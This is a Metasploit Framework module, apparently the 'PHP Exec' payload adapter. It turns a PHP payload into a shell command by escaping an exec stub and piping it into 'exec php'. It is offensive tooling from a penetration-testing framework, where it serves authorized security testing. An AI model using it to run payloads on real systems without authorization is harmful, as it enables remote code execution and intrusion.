##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  include Msf::Payload::Adapter

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'PHP Exec',
        'Description' => 'Execute a PHP payload as an OS command from a Posix-compatible shell',
        'Author' => ['Spencer McIntyre', 'msutovsky-r7'],
        'Platform' => 'unix',
        'Arch' => ARCH_CMD,
        'License' => MSF_LICENSE,
        'AdaptedArch' => ARCH_PHP,
        'AdaptedPlatform' => 'php'
      )
    )
  end

  def compatible?(mod)
    if mod.type == Msf::MODULE_PAYLOAD && mod.class.const_defined?(:CachedSize) && mod.class::CachedSize != :dynamic && (mod.class::CachedSize >= 120_000) # echo does not have an unlimited amount of space
      return false
    end

    super
  end

  def generate(_opts = {})
    payload = super

    escaped_exec_stub = Shellwords.escape(Msf::Payload::Php.create_exec_stub(payload))

    if payload.include?("\n")
      escaped_payload = escaped_exec_stub
    else
      # pick the shorter one
      escaped_payload = [Shellwords.escape(payload), escaped_exec_stub].min_by(&:length)
    end

    "echo #{escaped_payload}|exec php"
  end

  def include_send_uuid
    true
  end
end
